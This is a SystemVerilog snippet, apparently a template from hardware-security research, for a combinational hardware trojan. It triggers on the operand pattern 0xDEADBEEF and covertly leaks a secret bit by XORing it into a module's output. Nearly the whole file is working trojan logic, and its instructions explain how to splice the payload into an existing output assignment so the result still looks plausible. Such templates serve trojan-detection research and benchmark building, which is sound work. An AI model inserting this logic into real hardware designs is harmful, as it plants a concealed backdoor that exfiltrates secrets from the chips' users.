/**
 * Combinational Covert Channel Trojan - Code Snippet
 * 
 * Trust-Hub Status: Related to Leak Information (power only, not timing)
 * Literature Sources: Kocher 1996, Lipp et al. 2021, Lin et al. 2009
 * 
 * Description:
 *   Injects a secret data bit into an observable output via XOR when the
 *   trojan trigger fires. In combinational circuits there is NO CLOCK,
 *   so timing modulation is impossible. Instead, this XORs the secret LSB
 *   directly into the output - the output flips between normal and (normal^secret)
 *   depending on whether operand_a_i matches the pattern.
 *
 *   The receiver observes: output XOR normal_value = secret_bit.
 *   This is detectable by anyone who knows the normal output value.
 *
 *   Key distinction from Leak:
 *     Covert: XOR injection (output = normal ^ secret) - subtle, output still looks plausible
 *     Leak:   Direct routing (output = secret) - more obvious
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential timing-modulation covert channel, use sequential/covert_template.sv.
 *
 * Trigger: Pattern match on operand_a_i
 * Payload: XOR adder_result_o[0] into observable output
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
// ============================================================

localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (operand_a_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD: Covert XOR Injection
// ============================================================

// Extract secret bit from payload signal (combinational - no register needed)
wire secret_bit;
assign secret_bit = adder_result_o[0];  // LSB is the secret to transmit

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Covert Channel: XOR secret_bit into an observable output.
//
// Integration Script Must:
//   Find the output assign to modulate (e.g., result_o, rd_data_o):
//     assign <output_signal> = <normal_expr>;
//   Replace with:
//     assign <output_signal> = trojan_active ? (<normal_expr> ^ {31'b0, secret_bit}) : <normal_expr>;
//
// Manual Example (combinational module result_o):
//   Find:    assign result_o = adder_result;
//   Replace: assign result_o = trojan_active ? (adder_result ^ {31'b0, secret_bit}) : adder_result;
//
// Receiver decodes: observed_output XOR known_normal_output = secret_bit.
//
// Effect: When operand_a_i == 32'hDEADBEEF:
//   Output LSB = normal_LSB XOR adder_result_o[0]
//   Output still looks like a valid number - covert and subtle.
//   Result: 1-bit per trigger covert exfiltration channel!